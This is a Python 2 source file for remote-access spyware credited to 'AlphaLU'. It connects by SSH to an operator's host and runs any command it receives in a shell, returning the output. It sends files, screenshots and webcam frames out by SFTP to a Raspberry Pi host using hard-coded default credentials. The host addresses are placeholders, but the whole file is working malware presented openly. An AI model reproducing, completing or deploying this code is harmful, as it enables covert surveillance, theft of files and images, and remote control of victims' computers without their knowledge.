import paramiko
import threading
import subprocess
from PIL import ImageGrab
import getpass
import cv2
import numpy as np
import os
import random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

__author__ = "AlphaLU"

host = 'blank'
SFTPHost = 'blank'
port = 22
user = 'blank'
password = 'blank'
directory = 'Path/to/directory'
target = getpass.getuser()
save_dir = "Path/to/directory"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, username='blank', password='blank')
chan = client.get_transport().open_session()
chan.send('[*] ' + target + ' is connected to host')
print chan.recv(1024)


def sftp(local_path, name):
    try:
        transport = paramiko.Transport((SFTPHost, port))
        transport.connect(username="pi", password="raspberry")
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, '/home/pi/Desktop/sftp/' + name)
        sftp.close()
        transport.close()
        return '[+] File transported'
    except Exception, e:
        return str(e)


def screenshot():
    try:
        img = ImageGrab.grab()
        img.save('path/to/save/image')
    except Exception, g:
        return str(g)
    return sftp('path/to/saved/image', "image/name")


# Add streaming option.

def webcam_capture():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite("path/to/save/image", frame)
    except Exception, e:
        return str(e)

    cap.release()
    cv2.destroyAllWindows()
    return sftp("path/to/saved/image", 'frame')

#Video capture and streaming are not yet fully implemented.

while True:
    command = chan.recv(1024)
    if 'take' in command:
        take, name, path = command.split(' ')
        chan.send(sftp(path, name))

    elif 'screen' in command:
        screen, hkey, scname = command.split(' ')
        chan.send(screenshot())

    elif 'webcam' in command:
        webcam, hkey, wbname = command.split(' ')
        chan.send(webcam_capture())

    # elif 'video' in command:
    #    chan.send(video_capture())

    else:
        try:
            proc = subprocess.check_output(command, shell=True)
            chan.send(proc)
        except Exception, e:
            chan.send(str(e))
